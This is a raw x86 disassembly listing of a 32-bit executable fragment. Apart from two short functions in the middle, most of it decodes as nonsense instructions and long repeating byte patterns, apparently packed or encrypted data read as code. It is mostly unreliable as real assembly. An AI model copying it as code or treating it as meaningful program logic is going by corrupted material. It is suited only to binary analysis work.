  422d74:	bound  ebp,QWORD PTR [esi+0x3783b17a]
  422d7a:	mov    ebp,0xfbfcc730
  422d7f:	inc    edx
  422d80:	push   ecx
  422d81:	fisub  WORD PTR [ecx-0x221211dc]
  422d87:	fcomp  QWORD PTR [esi+ebp*4]
  422d8a:	or     ecx,DWORD PTR [ebp-0x2b]
  422d8d:	out    dx,eax
  422d8e:	loopne 0x422d77
  422d90:	or     BYTE PTR [esi-0x644f951a],0xc7
  422d97:	pop    esp
  422d98:	xchg   BYTE PTR ds:0x69eb7d65,ah
  422d9e:	es stos DWORD PTR es:[edi],eax
  422da0:	aas    
  422da1:	loopne 0x422dfe
  422da3:	sti    
  422da4:	xchg   DWORD PTR ds:0xd2af4039,esi
  422daa:	popf   
  422dab:	sahf   
  422dac:	adc    eax,0xcb9f00ba
  422db1:	cwde   
  422db2:	mov    ecx,0x659b0575
  422db7:	xchg   ecx,eax
  422db8:	stos   BYTE PTR es:[edi],al
  422db9:	test   eax,0x2f7511e5
  422dbe:	push   0x67
  422dc0:	(bad)  
  422dc1:	addr16 adc al,0x4a
  422dc4:	push   edi
  422dc5:	repnz add esi,0x1f14de3
  422dcc:	(bad)  
  422dcd:	jnp    0x422e30
  422dcf:	push   esi
  422dd0:	pop    ebx
  422dd1:	xor    dh,BYTE PTR [edi+0x39cc96aa]
  422dd7:	inc    ebp
  422dd8:	dec    eax
  422dd9:	jge    0x422de7
  422ddb:	mov    al,0xde
  422ddd:	pop    eax
  422dde:	sbb    ebx,DWORD PTR [ebx]
  422de0:	mov    al,0x8c
  422de2:	mov    ?,WORD PTR [esi-0x66607716]
  422de8:	aad    0x57
  422dea:	mov    eax,ds:0x8cc26b18
  422def:	fmul   DWORD PTR [esi-0x66]
  422df2:	mov    al,0xda
  422df4:	aad    0x96
  422df6:	cmp    esp,esi
  422df8:	dec    eax
  422df9:	dec    edi
  422dfa:	test   DWORD PTR [edi],ebx
  422dfc:	xlat   BYTE PTR ds:[ebx]
  422dfd:	pop    ss
  422dfe:	inc    eax
  422dff:	or     ah,BYTE PTR [ecx]
  422e01:	lock cs nop
  422e04:	pop    ebx
  422e05:	retf   0xcdb3
  422e08:	ss retf 
  422e0a:	xchg   edi,eax
  422e0b:	es dec eax
  422e0d:	sar    edx,1
  422e0f:	sahf   
  422e10:	loopne 0x422de2
  422e12:	mov    al,ds:0xf3a705ab
  422e17:	pusha  
  422e18:	ror    DWORD PTR [edi-0x37a89947],cl
  422e1e:	jnp    0x422de9
  422e20:	stos   DWORD PTR es:[edi],eax
  422e21:	sbb    esi,DWORD PTR [ebx+0x77f0c3ae]
  422e27:	iret   
  422e28:	sub    DWORD PTR [edx-0x34428e84],ebp
  422e2e:	push   es
  422e2f:	cli    
  422e30:	repz fwait
  422e32:	int3   
  422e33:	pop    ebx
  422e34:	mov    al,ds:0x9cb760ac
  422e39:	pop    eax
  422e3a:	sbb    ebx,eax
  422e3c:	loopne 0x422e69
  422e3e:	xchg   ecx,eax
  422e3f:	add    eax,0x3b88570
  422e44:	adc    eax,0xc6c566e9
  422e49:	adc    cl,al
  422e4b:	not    dh
  422e4d:	(bad)
  422e50:	sub    al,0x3
  422e52:	mov    al,ds:0xfd2a6b22
  422e57:	xor    BYTE PTR [edx],dl
  422e59:	mov    al,0x81
  422e5b:	daa    
  422e5c:	test   eax,0x7bf88ffd
  422e61:	leave  
  422e62:	loop   0x422ea4
  422e64:	cmp    eax,0xfab2218a
  422e69:	int    0xec
  422e6b:	cli    
  422e6c:	or     dh,ch
  422e6e:	jns    0x422e5c
  422e70:	aad    0x36
  422e72:	stos   BYTE PTR es:[edi],al
  422e73:	aas    
  422e74:	fstp   TBYTE PTR [edi]
  422e76:	or     eax,0xc54fa4a0
  422e7b:	cmp    eax,0x8f961061
  422e80:	inc    edi
  422e81:	sub    cl,BYTE PTR [ebp-0x669febce]
  422e87:	cld    
  422e88:	xor    ebx,DWORD PTR [eax]
  422e8a:	mov    ds:0x255f828,eax
  422e8f:	call   0xda5f:0x16ab2c33
  422e96:	or     cl,BYTE PTR [ebp+eax*1+0x67]
  422e9a:	or     BYTE PTR [edx],0x39
  422e9d:	push   ebp
  422e9e:	iret   
  422e9f:	jnp    0x422e32
  422ea1:	int3   
  422ea2:	pop    esp
  422ea3:	pop    esp
  422ea4:	int3   
  422ea5:	or     esi,edx
  422ea7:	and    al,0x1c
  422ea9:	scas   al,BYTE PTR es:[edi]
  422eaa:	call   0x317dddae
  422eaf:	ds sahf 
  422eb1:	jns    0x422e35
  422eb3:	and    ah,BYTE PTR [edx]
  422eb5:	loopne 0x422e64
  422eb7:	nop
  422eb8:	or     edi,esi
  422eba:	ret    0x72f1
  422ebd:	inc    BYTE PTR [ebp-0x5ed2cc48]
  422ec3:	mov    edx,0xe880de55
  422ec8:	fnsave [edi+0x1f5d7e5]
  422ece:	or     eax,0xbf2fb6be
  422ed3:	inc    eax
  422ed4:	sahf   
  422ed5:	cmp    eax,0x54ecfbdb
  422eda:	out    dx,al
  422edb:	cmp    BYTE PTR [ebx+edi*1],bl
  422ede:	mov    al,ds:0x4fe5fb7c
  422ee3:	aam    0x68
  422ee5:	push   ds
  422ee6:	jmp    0xf61:0x54b2c758
  422eed:	scas   al,BYTE PTR es:[edi]
  422eee:	adc    DWORD PTR [edi],eax
  422ef0:	mov    ebx,ss
  422ef2:	lods   eax,DWORD PTR ds:[esi]
  422ef3:	std    
  422ef4:	xchg   ecx,eax
  422ef5:	inc    esp
  422ef6:	(bad)  
  422ef7:	xchg   ebx,eax
  422ef8:	fld    TBYTE PTR [eax-0x2]
  422efb:	jge    0x422eee
  422efd:	and    dl,BYTE PTR [ebp-0x766fb653]
  422f03:	or     al,0xfb
  422f05:	das    
  422f06:	mov    al,0xf6
  422f08:	clc    
  422f09:	or     al,0xf5
  422f0b:	and    DWORD PTR [esi+esi*1],esp
  422f0e:	call   0x37c5:0x2d7fcec9
  422f15:	in     al,dx
  422f16:	cs jne 0x422f91
  422f19:	xor    BYTE PTR [eax],bh
  422f1b:	xor    esi,ecx
  422f1d:	frstor [edi+0x3953f99f]
  422f23:	clc    
  422f24:	lock repnz sub edi,DWORD PTR [edx+0x34]
  422f29:	mov    eax,0x1
  422f2e:	mov    esp,ebp
  422f30:	pop    ebp
  422f31:	ret    
  422f32:	int3   
  422f33:	int3   
  422f34:	int3   
  422f35:	int3   
  422f36:	int3   
  422f37:	int3   
  422f38:	int3   
  422f39:	int3   
  422f3a:	int3   
  422f3b:	int3   
  422f3c:	int3   
  422f3d:	int3   
  422f3e:	int3   
  422f3f:	int3   
  422f40:	push   ebp
  422f41:	mov    ebp,esp
  422f43:	sub    esp,0x8
  422f46:	mov    eax,ds:0x429028
  422f4b:	push   esi
  422f4c:	push   0x0
  422f4e:	push   0x4e
  422f50:	push   0x1e
  422f52:	push   0x0
  422f54:	push   0xffffffff
  422f56:	mov    DWORD PTR [ebp-0x4],0x0
  422f5d:	mov    DWORD PTR [ebp-0x8],eax
  422f60:	call   DWORD PTR ds:0x429038
  422f66:	mov    esi,DWORD PTR [ebp-0x8]
  422f69:	call   esi
  422f6b:	mov    DWORD PTR [ebp-0x4],eax
  422f6e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f72:	jne    0x422f81
  422f74:	push   0xfb11b03d
  422f79:	call   0x4111f0
  422f7e:	add    esp,0x4
  422f81:	xor    eax,eax
  422f83:	pop    esi
  422f84:	mov    esp,ebp
  422f86:	pop    ebp
  422f87:	ret    
  422f88:	nop
  422f89:	nop
  422f8a:	nop
  422f8b:	nop
  422f8c:	nop
  422f8d:	nop
  422f8e:	nop
  422f8f:	nop
  422f90:	sub    esp,0x10
  422f93:	push   0x0
  422f95:	push   0x0
  422f97:	push   0x0
  422f99:	call   DWORD PTR ds:0x429034
  422f9f:	lea    eax,[esp+0x0]
  422fa3:	push   eax
  422fa4:	call   DWORD PTR ds:0x42903c
  422faa:	cmp    WORD PTR [esp+0x0],0x0
  422fb0:	je     0x422fd2
  422fb2:	push   0x0
  422fb4:	call   0x422f40
  422fb9:	add    esp,0x4
  422fbc:	call   0x411000
  422fc1:	push   0x0
  422fc3:	push   0x0
  422fc5:	call   0x424410
  422fca:	xor    eax,eax
  422fcc:	add    esp,0x10
  422fcf:	ret    0x10
  422fd2:	(bad)  
  422fd3:	jns    0x422feb
  422fd5:	fdiv   QWORD PTR [ebp+0x22]
  422fd8:	call   0x9fb4:0xdd3597b9
  422fdf:	or     ecx,ebx
  422fe1:	dec    esp
  422fe2:	dec    esp
  422fe3:	int    0x21
  422fe5:	call   0xdfb4:0xdd3197b9
  422fec:	hlt    
  422fed:	xor    al,0x4c
  422fef:	dec    esp
  422ff0:	jne    0x423013
  422ff2:	call   0x9fb4:0xdd3197b9
  422ff9:	hlt    
  422ffa:	xor    al,0x4c
  422ffc:	dec    esp
  422ffd:	jne    0x423020
  422fff:	call   0x9fb4:0xdd3197b9
  423006:	hlt    
  423007:	xor    al,0x4c
  423009:	dec    esp
  42300a:	jne    0x42302d
  42300c:	call   0x9fb4:0xddc997b9
  423013:	cli    
  423014:	sub    esi,esi
  423016:	inc    edx
  423017:	jne    0x422fae
  423019:	xchg   ebx,eax
  42301a:	je     0x422fd2
  42301c:	mov    esp,ebx
  42301e:	clc    
  42301f:	push   edx
  423020:	aad    0x60
  423022:	and    al,0x25
  423024:	push   es
  423025:	add    edx,ebp
  423027:	retf   
  423028:	clc    
  423029:	push   esi
  42302a:	scas   eax,DWORD PTR es:[edi]
  42302b:	aad    0xf2
  42302d:	aam    0x57
  42302f:	sub    eax,0xee4e1b22
  423034:	cdq    
  423035:	cmc    
  423036:	push   esp
  423037:	std    
  423038:	(bad)  
  423039:	jmp    0x6555:0x2225149a
  423040:	aad    0xea
  423042:	mov    bh,0x5c
  423044:	mov    dl,0xd0
  423046:	cli    
  423047:	fidivr DWORD PTR [ecx]
  423049:	inc    ecx
  42304a:	inc    esi
  42304b:	push   ecx
  42304c:	and    DWORD PTR [edx-0x22ce6847],ebx
  423052:	mov    ah,0x98
  423054:	ins    DWORD PTR es:[edi],dx
  423055:	enter  0xf15,0x8d
  423059:	mov    bl,0x90
  42305b:	cli    
  42305c:	outs   dx,DWORD PTR ds:[esi]
  42305d:	mov    ds:0x6667f7d7,eax
  423062:	ds adc al,0x29
  423065:	jns    0x423092
  423067:	lds    eax,FWORD PTR [ecx+0x5]
  42306a:	cmp    eax,DWORD PTR [ebp-0x901582f]
  423070:	mov    ah,0xde
  423072:	jg     0x4230ed
  423074:	inc    DWORD PTR [eax+0x2625599d]
  42307a:	xchg   ebp,eax
  42307b:	fdivr  DWORD PTR [edx-0x26ccb98b]
  423081:	or     BYTE PTR [ebx-0x41334e23],dh
  423087:	aad    0xc
  423089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42308a:	inc    esi
  42308b:	push   es
  42308c:	cmc    
  42308d:	and    BYTE PTR [eax-0x285c901f],dl
  423093:	mul    DWORD PTR [edi+0x67]
  423096:	ds fs mov ch,0xe7
  42309a:	sub    esp,DWORD PTR ds:0x903b1761
  4230a0:	dec    esp
  4230a1:	or     eax,0x71296cfe
  4230a6:	jg     0x4230d1
  4230a8:	bound  ebp,QWORD PTR [ebx]
  4230aa:	popf   
  4230ab:	imul   edi,DWORD PTR [eax-0x33496a44],0x442d46de
  4230b5:	xchg   ebp,eax
  4230b6:	mov    bl,0xd5
  4230b8:	leave  
  4230b9:	dec    edi
  4230ba:	mov    esi,0x24579dcd
  4230bf:	jge    0x97fbc178
  4230c5:	xor    ebp,ebx
  4230c7:	mov    ah,0x9f
  4230c9:	hlt    
  4230ca:	xor    al,0x1c
  4230cc:	or     DWORD PTR [ebp+0x21],esi
  4230cf:	(bad)  
  4230d0:	mov    eax,0x57313195
  4230d5:	sar    BYTE PTR [ebx+0x754c4c34],0x21
  4230dc:	call   0x9eb7:0xddd197b9
  4230e3:	push   DWORD PTR ds:0xcd754c46
  4230e9:	sahf   
  4230ea:	mov    ecx,0xb4db3597
  4230ef:	lahf   
  4230f0:	hlt    
  4230f1:	xor    al,0x4c
  4230f3:	dec    ebp
  4230f4:	enter  0x9a21,0xb9
  4230f8:	xchg   DWORD PTR [ecx],esi
  4230fa:	fnsave [edi+ebx*4+0x4c4c34f1]
  423101:	xor    al,0x21
  423103:	call   0x9fb6:0xdd3197a9
  42310a:	hlt    
  42310b:	xor    DWORD PTR [ebp+ecx*2+0x75],ecx
  42310f:	and    DWORD PTR [edx-0x22cb6847],ebx
  423115:	mov    ch,0x9f
  423117:	hlt    
  423118:	xor    al,0x4c
  42311a:	dec    esp
  42311b:	jne    0x4230be
  42311d:	xchg   ecx,eax
  42311e:	mov    ecx,0xb4dd3597
  423123:	and    al,ch
  423125:	xor    DWORD PTR [esi+ecx*2+0x75],ecx
  423129:	and    DWORD PTR [edx],ebx
  42312b:	mov    ecx,0xb4dd2197
  423130:	(bad)  
  423131:	hlt    
  423132:	xor    al,0x4c
  423134:	dec    esp
  423135:	and    DWORD PTR gs:[edx-0x22ce6857],ebx
  42313c:	mov    ah,0x9f
  42313e:	hlt    
  42313f:	and    al,0x4c
  423141:	dec    esp
  423142:	jne    0x423165
  423144:	call   0x9fb4:0xdd3197b9
  42314b:	jo     0x4231a7
  42314d:	inc    edi
  42314e:	dec    esp
  42314f:	sbb    al,0x22
  423151:	call   0x50b4:0xd60197b9
  423158:	leave  
  423159:	xor    al,0x4c
  42315b:	dec    esp
  42315c:	jne    0x42317f
  42315e:	call   0x9fb4:0xdd3197b9
  423165:	hlt    
  423166:	xor    al,0x4c
  423168:	dec    esp
  423169:	jne    0x42318c
  42316b:	call   0x9fb4:0xdd3197b9
  423172:	hlt    
  423173:	xor    al,0x4c
  423175:	dec    esp
  423176:	jne    0x423199
  423178:	call   0x9fb4:0xdd3197b9
  42317f:	hlt    
  423180:	xor    al,0x4c
  423182:	dec    esp
  423183:	jne    0x4231a6
  423185:	call   0x9fb4:0xdd3197b9
  42318c:	hlt    
  42318d:	xor    al,0x4c
  42318f:	dec    esp
  423190:	jne    0x4231b3
  423192:	call   0x9fb4:0xdd3197b9
  423199:	hlt    
  42319a:	xor    al,0x4c
  42319c:	dec    esp
  42319d:	jne    0x4231c0
  42319f:	call   0x9fb4:0xdd3197b9
  4231a6:	hlt    
  4231a7:	xor    al,0x4c
  4231a9:	dec    esp
  4231aa:	jne    0x4231cd
  4231ac:	call   0x9fb4:0xdd3197b9
  4231b3:	hlt    
  4231b4:	xor    al,0x4c
  4231b6:	dec    esp
  4231b7:	jne    0x4231da
  4231b9:	call   0x9fb4:0xdd3197b9
  4231c0:	hlt    
  4231c1:	xor    al,0x4c
  4231c3:	bound  eax,QWORD PTR [ecx]
  4231c5:	inc    esp
  4231c6:	loop   0x423195
  4231c8:	xchg   edi,eax
  4231c9:	xor    ebp,ebx
  4231cb:	mov    ah,0xbf
  4231cd:	push   DWORD PTR [esp+ecx*2]
  4231d0:	pop    esp
  4231d1:	jne    0x4231f4
  4231d3:	call   0x9fb0:0xdd319383
  4231da:	hlt    
  4231db:	or     DWORD PTR fs:[edi],ecx
  4231de:	inc    edi
  4231df:	jne    0x4231b6
  4231e1:	mov    ecx,0xb4dd3197
  4231e6:	lahf   
  4231e7:	aam    0x34
  4231e9:	dec    esp
  4231ea:	lods   al,BYTE PTR ds:[esi]
  4231eb:	pop    ebx
  4231ec:	push   ebx
  4231ed:	jmp    0xdd7426bd
  4231f2:	mov    ah,0x9f
  4231f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231f5:	xor    al,0x4c
  4231f7:	dec    esp
  4231f8:	inc    ebp
  4231f9:	sub    bl,BYTE PTR [edx-0x22ce3847]
  4231ff:	mov    ah,0xa1
  423201:	lock xor al,0x4c
  423204:	dec    esp
  423205:	jne    0x423228
  423207:	call   0x9fb4:0xdd3197b9
  42320e:	hlt    
  42320f:	adc    al,0x4c
  423211:	dec    esp
  423212:	xchg   ebp,eax
  423213:	and    DWORD PTR [edx-0x22ce6847],ebx
  423219:	mov    ah,0x9f
  42321b:	hlt    
  42321c:	xor    al,0x4c
  42321e:	dec    esp
  42321f:	jne    0x423242
  423221:	call   0x9fb4:0xdd3197b9
  423228:	hlt    
  423229:	xor    al,0x4c
  42322b:	dec    esp
  42322c:	jne    0x42324f
  42322e:	call   0x9fb4:0xdd3197b9
  423235:	hlt    
  423236:	xor    al,0x4c
  423238:	dec    esp
  423239:	jne    0x42325c
  42323b:	call   0x9fb4:0xdd3197b9
  423242:	hlt    
  423243:	xor    al,0x4c
  423245:	dec    esp
  423246:	jne    0x423269
  423248:	call   0x9fb4:0xdd3197b9
  42324f:	hlt    
  423250:	xor    al,0x4c
  423252:	dec    esp
  423253:	jne    0x423276
  423255:	call   0x9fb4:0xdd3197b9
  42325c:	hlt    
  42325d:	xor    al,0x4c
  42325f:	dec    esp
  423260:	jne    0x423283
  423262:	call   0x9fb4:0xdd3197b9
  423269:	hlt    
  42326a:	xor    al,0x4c
  42326c:	dec    esp
  42326d:	jne    0x423290
  42326f:	call   0x9fb4:0xdd3197b9
  423276:	hlt    
  423277:	xor    al,0x4c
  423279:	dec    esp
  42327a:	jne    0x42329d
  42327c:	call   0x9fb4:0xdd3197b9
  423283:	hlt    
  423284:	xor    al,0x4c
  423286:	dec    esp
  423287:	jne    0x4232aa
  423289:	call   0x9fb4:0xdd3197b9
  423290:	hlt    
  423291:	xor    al,0x4c
  423293:	dec    esp
  423294:	jne    0x4232b7
  423296:	call   0x9fb4:0xdd3197b9
  42329d:	hlt    
  42329e:	xor    al,0x4c
  4232a0:	dec    esp
  4232a1:	jne    0x4232c4
  4232a3:	call   0x9fb4:0xdd3197b9
  4232aa:	hlt    
  4232ab:	xor    al,0x4c
  4232ad:	dec    esp
  4232ae:	jne    0x4232d1
  4232b0:	call   0x9fb4:0xdd3197b9
  4232b7:	hlt    
  4232b8:	xor    al,0x4c
  4232ba:	dec    esp
  4232bb:	jne    0x4232de
  4232bd:	call   0x9fb4:0xdd3197b9
  4232c4:	hlt    
  4232c5:	xor    al,0x4c
  4232c7:	dec    esp
  4232c8:	jne    0x4232eb
  4232ca:	call   0x9fb4:0xdd3197b9
  4232d1:	hlt    
  4232d2:	xor    al,0x4c
  4232d4:	dec    esp
  4232d5:	jne    0x4232f8
  4232d7:	call   0x9fb4:0xdd3197b9
  4232de:	hlt    
  4232df:	xor    al,0x4c
  4232e1:	dec    esp
  4232e2:	jne    0x423305
  4232e4:	call   0x9fb4:0xdd3197b9
  4232eb:	hlt    
  4232ec:	xor    al,0x4c
  4232ee:	dec    esp
  4232ef:	jne    0x423312
  4232f1:	call   0x9fb4:0xdd3197b9
  4232f8:	hlt    
  4232f9:	xor    al,0x4c
  4232fb:	dec    esp
  4232fc:	jne    0x42331f
  4232fe:	call   0x9fb4:0xdd3197b9
  423305:	hlt    
  423306:	xor    al,0x4c
  423308:	dec    esp
  423309:	jne    0x42332c
  42330b:	call   0x9fb4:0xdd3197b9
  423312:	hlt    
  423313:	xor    al,0x4c
  423315:	dec    esp
  423316:	jne    0x423339
  423318:	call   0x9fb4:0xdd3197b9
  42331f:	hlt    
  423320:	xor    al,0x4c
  423322:	dec    esp
  423323:	jne    0x423346
  423325:	call   0x9fb4:0xdd3197b9
  42332c:	hlt    
  42332d:	xor    al,0x4c
  42332f:	dec    esp
  423330:	jne    0x423353
  423332:	call   0x9fb4:0xdd3197b9
  423339:	hlt    
  42333a:	xor    al,0x4c
  42333c:	dec    esp
  42333d:	jne    0x423360
  42333f:	call   0x9fb4:0xdd3197b9
  423346:	hlt    
  423347:	xor    al,0x4c
  423349:	dec    esp
  42334a:	jne    0x42336d
  42334c:	call   0x9fb4:0xdd3197b9
  423353:	hlt    
  423354:	xor    al,0x4c
  423356:	dec    esp
  423357:	jne    0x42337a
  423359:	call   0x9fb4:0xdd3197b9
  423360:	hlt    
  423361:	xor    al,0x4c
  423363:	dec    esp
  423364:	jne    0x423387
  423366:	call   0x9fb4:0xdd3197b9
  42336d:	hlt    
  42336e:	xor    al,0x4c
  423370:	dec    esp
  423371:	jne    0x423394
  423373:	call   0x9fb4:0xdd3197b9
  42337a:	hlt    
  42337b:	xor    al,0x4c
  42337d:	dec    esp
  42337e:	jne    0x4233a1
  423380:	call   0x9fb4:0xdd3197b9
  423387:	hlt    
  423388:	xor    al,0x4c
  42338a:	dec    esp
  42338b:	jne    0x4233ae
  42338d:	call   0x9fb4:0xdd3197b9
  423394:	hlt    
  423395:	xor    al,0x4c
  423397:	dec    esp
  423398:	jne    0x4233bb
  42339a:	call   0x9fb4:0xdd3197b9
  4233a1:	hlt    
  4233a2:	xor    al,0x4c
  4233a4:	dec    esp
  4233a5:	jne    0x4233c8
  4233a7:	call   0x9fb4:0xdd3197b9
  4233ae:	hlt    
  4233af:	xor    al,0x4c
  4233b1:	dec    esp
  4233b2:	jne    0x4233d5
  4233b4:	call   0x9fb4:0xdd3197b9
  4233bb:	hlt    
  4233bc:	xor    al,0x4c
  4233be:	dec    esp
  4233bf:	jne    0x4233e2
  4233c1:	call   0x9fb4:0xdd3197b9
  4233c8:	hlt    
  4233c9:	xor    al,0x4c
  4233cb:	dec    esp
  4233cc:	jne    0x4233ef
  4233ce:	call   0x71f3:0xdd3197b9
  4233d5:	(bad)  
  4233d6:	xor    al,0x63
  4233d8:	dec    esp
  4233d9:	jne    0x42340c
  4233db:	call   0xf9c5:0x793bdb9
  4233e2:	or     ebx,DWORD PTR [ecx]
  4233e4:	ror    bl,cl
  4233e6:	and    eax,0x8451accc
  4233eb:	test   DWORD PTR [eax-0x2e],ecx
  4233ee:	out    dx,al
  4233ef:	jo     0x42345f
  4233f1:	pop    edi
  4233f2:	std    
  4233f3:	ret    0xf737
  4233f6:	pop    ebp
  4233f7:	sbb    eax,0xfd9a1bb0
  4233fc:	or     esi,DWORD PTR fs:[ebp+0x7f]
  423400:	cmp    dl,BYTE PTR [eax+0x16979b8d]
  423406:	jp     0x423444
  423408:	retf   0x59a5
  42340b:	in     eax,0x7e
  42340d:	dec    eax
  42340e:	cld    
  42340f:	mov    cs,WORD PTR [eax]
  423411:	mul    DWORD PTR [ecx]
  423413:	xchg   BYTE PTR [edx-0x12a2e472],dl
  423419:	and    BYTE PTR [edx+0x1a7eb69b],dl
  42341f:	and    eax,DWORD PTR gs:[edx+0x4ead39ef]
  423426:	in     al,dx
  423427:	mov    esp,0xa8c00d25
  42342c:	sub    eax,0x5a2ea9a8
  423431:	jecxz  0x42340a
  423433:	xchg   esp,eax
  423434:	xor    ch,BYTE PTR [ebx-0x6a]
  423437:	lock call 0xcabc:0x923e675d
  42343f:	stos   BYTE PTR es:[edi],al
  423440:	mov    ebx,0xefff2b48
  423445:	and    edx,esi
  423447:	inc    ebx
  423448:	je     0x423449
  42344a:	and    bh,BYTE PTR [edi+0xf]
  42344d:	test   al,0x97
  42344f:	enter  0xf24a,0x14
  423453:	jmp    0x1fdd494e
  423458:	mov    edi,0xf69708d2
  42345d:	call   0xe5ec4fc
  423462:	fs mov esi,0x72046e91
  423468:	and    al,0xa2
  42346a:	push   esi
  42346b:	cli    
  42346c:	inc    ebx
  42346d:	fcmovu st,st(7)
  42346f:	pop    esp
  423470:	inc    ebp
  423471:	neg    BYTE PTR ds:[ecx+eiz*2]
  423475:	push   ebx
  423476:	outs   dx,DWORD PTR ds:[esi]
  423477:	sub    al,0x82
  423479:	jmp    0xaaa4:0x1a0b1ed5
  423480:	das    
  423481:	jle    0x4234e1
  423483:	nop
  423484:	ins    DWORD PTR es:[edi],dx
  423485:	push   esi
  423486:	push   0xffffffc8
  423488:	cmp    al,BYTE PTR [edi+0x11]
  42348b:	aas    
  42348c:	outs   dx,BYTE PTR ds:[esi]
  42348d:	and    al,0x61
  42348f:	pop    ds
  423490:	and    eax,0xb7d03760
  423495:	inc    ebp
  423496:	mov    es,WORD PTR [ecx]
  423498:	add    bh,BYTE PTR ds:0xf47ce5ca
  42349e:	push   esp
  42349f:	sbb    dh,BYTE PTR [eax]
  4234a1:	loope  0x4234ac
  4234a3:	stos   BYTE PTR es:[edi],al
  4234a4:	cmp    dl,dh
  4234a6:	out    dx,al
  4234a7:	xchg   esp,eax
  4234a8:	xchg   edi,eax
  4234a9:	dec    ecx
  4234aa:	adc    eax,0x81f455a8
  4234af:	mov    dl,0xa5
  4234b1:	jge    0x42349c
  4234b3:	dec    edi
  4234b4:	sbb    BYTE PTR [eax+0x29b7b027],bl
  4234ba:	scas   al,BYTE PTR es:[edi]
  4234bb:	arpl   WORD PTR [edx+0x30],cx
  4234be:	push   esp
  4234bf:	daa    
  4234c0:	xchg   edx,eax
  4234c1:	xchg   edi,eax
  4234c2:	or     ebx,DWORD PTR [esi+0x7a]
  4234c5:	or     DWORD PTR [ebp+0x25],edi
  4234c8:	ret    
  4234c9:	jne    0x4234d1
  4234cb:	inc    esp
  4234cc:	dec    eax
  4234cd:	aaa    
  4234ce:	pop    ss
  4234cf:	das    
  4234d0:	es call 0xd744:0xaed9389c
  4234d8:	or     DWORD PTR [ecx-0x21983cc9],0xa563dfee
  4234e2:	push   edi
  4234e3:	fwait
  4234e4:	sti    
  4234e5:	cmp    bh,bl
  4234e7:	mov    ds:0xf6f4ba4a,eax
  4234ec:	add    al,0x93
  4234ee:	push   es
  4234ef:	mov    al,ds:0xb1cf9ef1
  4234f4:	psrld  mm4,QWORD PTR [ebx-0x558b4d9e]
  4234fb:	sub    dh,cl
  4234fd:	fisttp WORD PTR [eax+0x69]
  423500:	imul   edx,DWORD PTR [eax-0x61],0x834584ae
  423507:	add    BYTE PTR [edx-0x38],bh
  42350a:	cwde   
  42350b:	out    0x67,al
  42350d:	int    0xd1
  42350f:	inc    esi
  423510:	mov    bl,0x59
  423512:	push   edi
  423513:	stos   BYTE PTR es:[edi],al
  423514:	int3   
  423515:	jge    0x4234e7
  423517:	test   BYTE PTR [ecx+0x69],al
  42351a:	aaa    
  42351b:	loop   0x423568
  42351d:	or     al,0x27
  42351f:	mov    dl,dh
  423521:	dec    ecx
  423522:	cdq    
  423523:	cmp    eax,0x59daa1e1
  423528:	fisttp DWORD PTR [eax+0x696aa3d9]
  42352e:	inc    esp
  42352f:	jmp    0x684c61cb
  423534:	fld    QWORD PTR [esi-0x331cd773]
  42353a:	cmp    DWORD PTR [eax-0x5f],ecx
  42353d:	aam    0x3d
  42353f:	or     al,0xcd
  423541:	jl     0x42359e
  423543:	call   edi
  423545:	cdq    
  423546:	sub    ch,BYTE PTR [eax]
  423548:	out    0x9a,al
  42354a:	lods   eax,DWORD PTR ds:[esi]
  42354b:	into   
  42354c:	inc    ebp
  42354d:	or     ch,BYTE PTR [ebx-0x71]
  423550:	stos   BYTE PTR es:[edi],al
  423551:	mov    ebp,0x8de401b4
  423556:	mov    BYTE PTR [edi+0x47],ch
  423559:	mov    BYTE PTR [ebp-0x1952e769],dl
  42355f:	aas    
  423560:	inc    ebp
  423561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423562:	retf   0xcc88
  423565:	dec    edi
  423566:	outs   dx,BYTE PTR ds:[esi]
  423567:	shr    BYTE PTR [esi],cl
  423569:	dec    edx
  42356a:	mov    BYTE PTR gs:[edi],ah
  42356d:	mov    ch,0x25
  42356f:	pusha  
  423570:	lock mov dh,0x14
  423573:	inc    esp
  423574:	stc    
  423575:	inc    ebx
  423576:	int    0x51
  423578:	scas   eax,DWORD PTR es:[edi]
  423579:	mov    ah,0x9c
  42357b:	or     eax,0xeb99ebf1
  423580:	xor    DWORD PTR [eax+0x4e],edi
  423583:	and    ebx,edi
  423585:	pop    edi
  423586:	sbb    edi,eax
  423588:	int    0x3c
  42358a:	aas    
  42358b:	(bad)  
  42358c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42358d:	shl    DWORD PTR [ebx-0x1d6c3e0c],cl
  423593:	pop    ds
  423594:	or     ebp,DWORD PTR [eax]
  423596:	dec    edi
  423597:	js     0x423559
  423599:	add    al,0x96
  42359b:	and    DWORD PTR [edx+edx*4-0x102d0048],eax
  4235a2:	xor    al,0x9d
  4235a4:	pop    ebx
  4235a5:	sbb    dl,BYTE PTR [esi-0x58]
  4235a8:	jnp    0x423598
  4235aa:	mov    esp,0x1348ce91
  4235af:	ins    DWORD PTR es:[edi],dx
  4235b0:	lock xor bh,BYTE PTR [eax]
  4235b3:	ret    0x7e0c
  4235b6:	jmp    0x12d5:0xc710b94a
  4235bd:	adc    BYTE PTR [ecx-0x34abe5db],bl
  4235c3:	or     al,0x37
  4235c5:	jbe    0x423618
  4235c7:	jle    0x423622
  4235c9:	or     eax,0x937598d6
  4235ce:	ror    BYTE PTR [edx+0x6ebbbc98],cl
  4235d4:	jge    0x4235d3
  4235d6:	(bad)  
  4235d7:	mov    ch,BYTE PTR [esi-0x59]
  4235da:	mov    cl,0x8
  4235dc:	xor    DWORD PTR [ebx+eiz*1],0x77
  4235e0:	push   edi
  4235e1:	mov    eax,ds:0x23e7189
  4235e6:	ja     0x423590
  4235e8:	fnstsw WORD PTR [edx]
  4235ea:	aaa    
  4235eb:	test   al,0x52
  4235ed:	popa   
  4235ee:	mov    ch,dh
  4235f0:	jns    0x423582
  4235f2:	dec    eax
  4235f3:	nop
  4235f4:	xor    bl,dh
  4235f6:	and    al,0x25
  4235f8:	int3   
  4235f9:	popf   
  4235fa:	pop    edx
  4235fb:	test   ch,0x51
  4235fe:	dec    eax
  4235ff:	aaa    
  423600:	sub    cl,cl
  423602:	fsub   st,st(2)
  423604:	mov    ebp,0xc2490662
  423609:	fwait
  42360a:	idiv   esi
  42360c:	outs   dx,BYTE PTR ds:[esi]
  42360d:	ja     0x423591
  42360f:	mov    ebx,0x5d326e56
